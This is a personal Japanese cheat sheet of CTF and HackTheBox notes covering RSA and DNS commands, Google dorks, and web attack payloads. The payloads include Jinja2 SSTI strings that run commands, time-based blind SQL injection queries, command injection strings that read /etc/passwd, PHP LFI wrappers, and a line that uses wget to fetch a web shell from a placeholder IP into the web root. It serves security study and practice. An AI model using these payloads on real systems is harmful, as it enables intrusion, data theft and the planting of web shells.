# tips

CTF や HackTheBox で使う情報を自分用にまとめる。

## RSA

秘密鍵の中身を見る

```
openssl rsa -in <private-key.pem> -text -noout
```

公開鍵の中身を見る

```
openssl rsa -pubin -in <public-key.pem> -text -noout
```

## DNS

dig

```
dig <example.com> IN
dig <example.com> ANY
dig <example.com> TXT
```

## Phishing

- MX (Mail exchange record)
- SPF (Sender Policy Framework)
- DKIM (DomainKeys Identified Mail)
- DMARC (Domain-based Message Authentication, Reporting and Conformance)

## OSINT

- Google Dorks: https://www.exploit-db.com/google-hacking-database

  - ext: `ext:(doc | pdf | xls | txt)`
  - filetype: `filetype:log`
  - intext: `intext:"Control Panel"`
  - intitle: `intitle:"Manager"`
  - inurl: `inurl:index.php`
  - site: `site:ftp.*.*.*`

## SSTI

**Server Side Template Injection**

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

**Flask + Jinja2**

参考: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

パラメータ利用 + シングルクォートなし

- `{{ }}`

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}

# パラメータ例:
# - arg1=open
# - arg2=/etc/passwd
```

- `{% %}`

```
{% if request.application.__globals__.__builtins__.__import__(request.args.arg1).popen(request.args.arg2).read() == 1 %}{% endif %}

# パラメータ例:
# - arg1=os
# - arg2=sleep 3
```

| 参照パラメータ | 格納場所             |
| -------------- | -------------------- |
| GET            | request.args.arg1    |
| POST           | request.values.arg1  |
| Cookie         | request.cookies.arg1 |

## SQLi

**SQL Injection**

- LIKE: `%`, `*`

**MySQL**

| 説明       | SQL                         |
| ---------- | --------------------------- |
| コメント   | `-- ` or `#` or `/* ... */` |
| If         | CASE                        |
| 文字列結合 | &#124;&#124;                |
|            | CONCAT(x, y, ...)           |
|            | GROUP_CONCAT(x, y, ...)     |
| 部分文字列 | SUBSTRING(x, index, length) |
| 長さ       | LENGTH(stuff)               |

- Time based:

テーブル名取得

```
'or if(substring((select group_concat(table_name) from information_schema.tables where table_type='BASE TABLE'),1,1)='a',sleep(3),0)or'
```

カラム名取得

```
'or if(substring((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='a',sleep(3),0)or'
```

値取得

```
'or if(substring((select group_concat(concat(id, ',', flag)) from users),1,1)='a',sleep(3),0)or'
```

**SQLite3**

| 説明                   | SQL                                     |
| ---------------------- | --------------------------------------- |
| コメント               | --                                      |
| If                     | CASE name WHEN 'taro' THEN 1 ELSE 0 END |
| 文字列結合             | &#124;&#124;                            |
| 部分文字列             | substr(x,y,z)                           |
| 長さ                   | length(stuff)                           |
| シングルクォートの生成 | select substr(quote(hex(0)),1,1);       |
| ダブルクォートの生成   | select cast(X'22' as text);             |

参考:

- http://atta.cked.me/home/sqlite3injectioncheatsheet
- https://www.sqlite.org/lang_UPSERT.html

## Command Injection

**Unix Payloads**

```
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
;netstat -a;
;system('cat%20/etc/passwd')
|id
\n/bin/ls -al\n
a);id
%0Acat%20/etc/passwd
& ping -i 30 127.0.0.1 &
<?php system("cat /etc/passwd");?>
```

**Windows Payloads**

```
'
'"
"
"'
%0a
%0a%0d
eval('ls')
exec('ls')
system('ls')
| sleep 1
; sleep 1
& sleep 1
&& sleep 1`
```

Links:

- https://github.com/payloadbox/command-injection-payload-list

**Payloads with Python**

```
a=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
a('os').popen('cat flag').read()
```

Bypass:

- to Hex: `(` => `\\x28`
- to Octal: `(` => `\50`

## Local File Inclusion (LFI)

**PHP**

パラメータにローカルファイルへのパスを指定することで、サーバにあるローカルファイルにアクセスを試みる攻撃。

Wrapper:

```
expect://ls

php://input
php://filter

phar://app.phar/index.php

zip://shell.jpg

data://text/plain,<?php phpinfo(); ?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

Methods:

```
/proc/self/environ
/proc/self/fd/1
/proc/self/cmdline
```

https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt

Files:

```
<? system('uname -a');?>
```

```
<? system('wget http://xxx.xxx.xxx.xxx/evil-shell.php -O /var/www/shell.php');?>
```

with phpinfo:

phpinfo() を利用して、アップロードしたファイルの一時保存場所を確認することができる。

```
POST /phpinfo.php HTTP/1.0
Content-Type: multipart/form-data; boundary=---------------------------
7db268605ae
Content-Length: 196
-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt"
Content-Type: text/plain
Security Test
-----------------------------7db268605ae
```

PHP Variables 内に出力される。

https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf
https://github.com/D35m0nd142/LFISuite

参考:

- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://highon.coffee/blog/lfi-cheat-sheet/

## Sites

**Databases**

- Default Passwords: https://cirt.net/passwords
- Exploit: https://www.exploit-db.com/
- Shodan: https://exploits.shodan.io/welcome

**Payloads**

- https://github.com/swisskyrepo/PayloadsAllTheThings

**Tools**

- CyberChef: https://gchq.github.io/CyberChef/
- Request Bin: https://requestbin.com/
- IP アドレス情報: https://ip-api.com/

**Documents**

- HackTricks: https://book.hacktricks.xyz/
